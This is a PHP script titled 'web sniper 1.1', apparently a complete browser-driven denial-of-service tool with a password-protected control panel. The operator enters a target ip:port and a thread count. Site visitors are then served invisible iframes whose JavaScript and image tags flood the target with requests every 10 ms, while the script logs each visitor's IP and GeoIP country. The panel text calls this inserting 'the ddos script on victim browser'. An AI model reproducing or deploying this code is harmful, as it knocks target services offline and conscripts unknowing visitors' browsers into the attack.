<?php
/*
                                        #
                                       ###
                                      ## ##
                                     ### ###
                                    ###   ###
                              ######################
                             ########################
                              ###  ###    ####  ####
                               ## ###      ### ####
                                #####      #######
                        ###     ######     ######   ###
                       ######  ########   #######  #######
                      ######   ######### #########  #######
                     #####    ####  ######### #####    ####
                     #####   #####   #######   #####   ####
                      ###########     #####     ###########
                       #########       ##        #########
                         #####                     #####
                    ~~~ web sniper 1.1 - script by unnex ~~~

                            - visit: www.unnex.de -
*/

//---config---
$password="cc03e747a6afbbcbf8be7668acfebee5"; //standart: test123
$content="<html><body><script>location.href='?root';</script>";
//------------

ini_set('display_errors', 0);
$f="./wall/needs.txt"; $fi="./wall/needsc.txt"; $fia="./wall/needsq.txt"; $geoinc="./wall/geoip.inc"; $geodat="./wall/GeoIPv4.dat"; $geodat6="./wall/GeoIPv6.dat"; $addr="";
if (file_exists($f)) { $fp=fopen($f,'r');
$addr=fread($fp, filesize($f));
fclose($fp); $addra=explode("\n", preg_replace("/\r/", "", $addr)); $addr=""; if (isset($addra[1])) { $addr=$addra[0]; $addrnum=$addra[1]; } }

if (isset($_GET["z"])) { if (file_exists($fi) && file_exists($fia)) { $fp=fopen($fi,"r"); $fna=fread($fp, filesize($fi)); fclose($fp);
if (!preg_match("/\) " . $_SERVER['REMOTE_ADDR'] . "\n/", $fna, $match)) { $country_code=""; require_once($geoinc); if (preg_match("/:/", $_SERVER['REMOTE_ADDR'], $match)) { $gi=geoip_open($geodat6, GEOIP_STANDARD); $country_code=geoip_country_code_by_addr_v6($gi, $_SERVER['REMOTE_ADDR']); } else { $gi=geoip_open($geodat,GEOIP_STANDARD); $country_code=geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']); } geoip_close($gi);
if (strlen($country_code)<1) { $country_code="??"; } $fp=fopen($fi,"a"); fwrite($fp, "(" . strtolower($country_code) . ") " . $_SERVER['REMOTE_ADDR'] . "\n"); fclose($fp); } } }

if (strlen($addr)>0 && isset($_GET["z"])) { $kun="a";
if (isset($_SERVER["HTTP_USER_AGENT"])) { $kari="";
if (strlen($_SERVER["HTTP_USER_AGENT"])>0) { $kunx=explode("/", $_SERVER["HTTP_USER_AGENT"]);
$kunxi=0; $kunxij=0;
while (isset($kunx[$kunxi])) { $kunxi++; } if ($kunxi>3) { $kunxi=$kunxi-3; }

$kunxx=explode(" ", $kunx[$kunxi]); $kunxxi=0;
while (isset($kunxx[$kunxxi])) { $kunxxi++; } if ($kunxxi>0) { $kunxxi=$kunxxi-1; }
if (isset($kunxx[$kunxxi]) && isset($kunxx[0])) { $kari=strtolower($kunxx[$kunxxi]); }

$kunxi=0; $kunxij=0;
while (isset($kunx[$kunxi])) { $kunxi++; } if ($kunxi>2) { $kunxi=$kunxi-2; }
$kunxx=explode(" ", $kunx[$kunxi]); $kunxxi=0;
while (isset($kunxx[$kunxxi])) { $kunxxi++; } if ($kunxxi>0) { $kunxxi=$kunxxi-1; }
if (isset($kunxx[$kunxxi]) && isset($kunxx[0])) { $kari.=strtolower($kunxx[$kunxxi]); }

if ($kari=="versionsafari" or $kari=="safariversion") { $kun="b"; }
if (preg_match("/konqueror/", $kari, $match)) { $kun="c"; } } }

if (!isset($_GET["y"])) { echo "<!DOCTYPE html><html><head><meta content=\"no-cache\">"; while ($addrnum>0) { echo "<iframe src=\"?z&y\" width=\"0\" height=\"0\" style=\"opacity: 0\"></iframe>"; $addrnum--; } echo "<script>setTimeout(\"location.reload()\", 600000);</script></body></html>"; exit; }

if ($kun=="a") { $addr=preg_replace("/\r\n/" ,"", $addr);
echo "<!DOCTYPE html><html><head><meta content=\"no-cache\"><script>
function loadXMLDoc(url) { var xmlhttp; if (window.XMLHttpRequest) {
xmlhttp=new XMLHttpRequest(); } else { xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\"); }
xmlhttp.onreadystatechange=function() { }
xmlhttp.open(\"GET\",url,true); xmlhttp.send(); }
function a() { loadXMLDoc('http://" . $addr . "/'+Math.random()+'.xml'); setTimeout(\"a()\", 10); }
</script></head><body onload=\"a();\"></body></html>"; exit; }
if ($kun=="b" or $kun=="c") { echo "<!DOCTYPE html><html><head><meta content=\"no-cache\"><script>setTimeout(\"document.getElementById('sji')[0].src='http://" . $addr . "/" . microtime() . ".png'\", 10);</script></head><body><img id=\"sji\" src=\"http://" . $addr . "/" . microtime() . ".png\" onerror=\"src='http://" . $addr . "/'+Math.random()+'.png';\" onload=\"src='http://" . $addr . "/'+Math.random()+'.png';\" width=\"0\" height=\"0\"></body></html>"; exit; } }
if (isset($_GET["z"]) && strlen($addr)<1) { echo "<html><head><meta content=\"no-cache\"></head><script>setTimeout(\"location.reload()\", 600000);</script></html>"; exit; }
if (isset($_COOKIE["p"]) && isset($_GET["root"])) { $nn=""; if (isset($_GET["e"]) &&  file_exists($f)) { unlink($f); $addr="nothing..."; if (isset($addrnum)) { unset($addrnum); } }

if (isset($_GET["d"]) && isset($_GET["f"])) { if (!preg_match("/:/", $_GET["d"], $match) or strlen($_GET["d"])<1) { $nn="<script>alert('Error: use ip:port(/ = optional: path) as Destination!')</script>"; } else {
$_GET["d"]=preg_replace("/ /" ,"%20", $_GET["d"]); $_GET["d"]=preg_replace("/\+/" ,"%2B", $_GET["d"]); $_GET["d"]=preg_replace("/</" ,"%3C", $_GET["d"]); $_GET["d"]=preg_replace("/\"/" ,"%22", $_GET["d"]); $_GET["d"]=preg_replace("/'/" ,"%27", $_GET["d"]);
$fp = fopen($f,'w'); fwrite($fp, $_GET["d"] . "\n" . (int)$_GET["f"]); fclose($fp);
$addr=$_GET["d"]; $addrnum=$_GET["f"]; } }

if ($_COOKIE["p"]==$password) { if (isset($_GET["qa"])) { setcookie("p", "0", time()-1); echo "<html><script>location.href='?root';</script></html>"; exit; }
echo "<html><head><title>web sniper</title><body style=\"overflow-y: hidden;\">" . $nn . "<style>html { background: url(./bg.jpg) no-repeat center center fixed; margin: 0; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; }</style></head><div align=\"center\">";

if (strlen($addr)<1) { $addr="nothing..."; }
echo "<h2 align=\"center\" style=\"color: white; text-shadow: 2px 4px 4px purple;\"><b>Destination"; if (isset($addrnum)) { echo " (threads: " . $addrnum . ")"; } echo ": " . $addr . "</b></h2><br>";

$limna=""; $suza="Start"; if (isset($_GET["c"])) { if ($_GET["c"]=="a") { if (file_exists($fia)) { unlink($fia); $fp=fopen($fi,"a"); fwrite($fp, "#Stopped: " . gmdate("M d Y H:i:s", time()) . " (UTC)\n"); fclose($fp); } else { $fp=fopen($fi,"a"); fwrite($fp, "#Started: " . gmdate("M d Y H:i:s", time()) . " (UTC)\n"); fclose($fp); $fp=fopen($fia,'w'); fwrite($fp, "a"); fclose($fp); } }
if ($_GET["c"]=="c") { if (file_exists($fi)) { unlink($fi); } if (file_exists($fia)) { unlink($fia); } } }

if (file_exists($fi)) { if (file_exists($fia)) { $suza="Stop"; } $fp=fopen($fi,'r'); $limna=fread($fp, filesize($fi)); fclose($fp); }
echo "<div align=\"center\">&nbsp;<font style=\"width:400px; height:9%; padding-top:3.5%; top: center; position: absolute;\"><h1 id=\"nim\" align=\"center\" style=\"color: white; text-shadow: 1px 2px 4px gray;\">initialising...</h1></font>
<textarea style=\"width:400px;height:34%;opacity:0.2;\" onfocus=\"style.opacity=0.9;\" onblur=\"style.opacity=0.2;\">" . $limna . "</textarea>&nbsp;</div>
<script>function jaer() { var now = new Date(); var nnow=now.toUTCString().split(\" \"); var taj=nnow[2]+' '+nnow[1]+' '+nnow[3]+' '+nnow[4]; document.getElementById(\"nim\").innerHTML=\"UTC<br>\"+taj; } setInterval(\"jaer()\", 1000); jaer();</script>
<table><tbody><tr><td>
<div style=\"width: 140px; background-color: rgb(139, 139, 131); cursor: pointer; opacity: 0.88;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.88'\" onclick=\"location.href='?root&c=a'\"><p align=\"center\">" . $suza . " IP counter!</p></div></td></div>
<td><div style=\"width: 80px; background-color: rgb(139, 139, 131); cursor: pointer; opacity: 0.88;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.88'\" onclick=\"location.href='?root&c=" . md5(microtime()) . "'\"><p align=\"center\">Reload</p></div></td>
<td><div style=\"width: 140px; background-color: rgb(139, 139, 131); cursor: pointer; opacity: 0.88;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.88'\" onclick=\"location.href='?root&c=c'\"><p align=\"center\">Reset</p></div></td>
</div></td></tr></tbody></table><img src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\" height=\"20%\"><br>
<br><input type=\"text\" value=\"127.0.0.1:80\" id=\"d\" style=\"width: 225px; text-align: center; opacity: 0.89; cursor: text; font-size: 14px;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.89'\" title=\"destination. usage: ip:port/path (path=optional)\">
<input type=\"text\" value=\"3\" id=\"f\" style=\"width: 50px;  text-align: center; opacity: 0.89; cursor: text; font-size: 14px;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.89'\" title=\"threads (how many frames insert the ddos script on victim browser). usage: 3\">
<table><tbody><tr><td>
<div style=\"width: 175px; background-color: rgb(139, 139, 131); cursor: pointer; opacity: 0.88;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.88'\" onclick=\"location.href='?root&d='+document.getElementById('d').value.replace(/&/g, '%26')+'&f='+document.getElementById('f').value.replace(/&/g, '%26')\"><p align=\"center\">ShootDown!</p></div></td>
<td><div style=\"width: 100px; background-color: rgb(139, 139, 131); cursor: pointer; opacity: 0.88;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.88'\" onclick=\"location.href='?root&e';\"><p align=\"center\">Reset</p></div></td></tr></tbody></table>
</div><div style=\"position:absolute; bottom:0; left:0; width:99%; height:50px; margin:-50px 0 auto;\"><div align=\"right\"><div style=\"width: 30px; background-color: rgb(139, 139, 131); cursor: pointer; opacity: 0.88;\" align=\"right\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.88'\" onclick=\"location.href='?root&qa=" . md5(microtime()) . "'\"><p align=\"center\">X</p></div></div></div></body></html>"; exit; } }

if (isset($_GET["root"])) { if (strlen($_GET["root"])>0 && isset($_POST["r"])) { if ($password==md5($_POST["r"])) { setcookie("p", $password); header('Location: ?root'); exit; } }
echo "<html><head><title>web sniper</title></head><body style=\"overflow-y: hidden;\"><script>function sja(event) { event = event || window.event; return event.keyCode; }</script><style>html { background: url(./bg.jpg) no-repeat center center fixed; margin: 0; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; }</style><br><div align=\"center\">
<form action=\"?root=a\" name=\"ar\" method=\"post\"><input type=\"password\" value=\"\" name=\"r\" id=\"kg\" style=\"text-align: center; opacity: 1; cursor: text; font-size: 14px;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.89'\">
<div style=\"width: 190px; background-color: rgb(139, 139, 131); cursor: pointer; opacity: 0.88;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.88'\" onclick=\"document.ar.submit();\"><p align=\"center\">login!</p></div>
</form></div></body></html>"; exit; } echo $content . "</body></html>";
?>
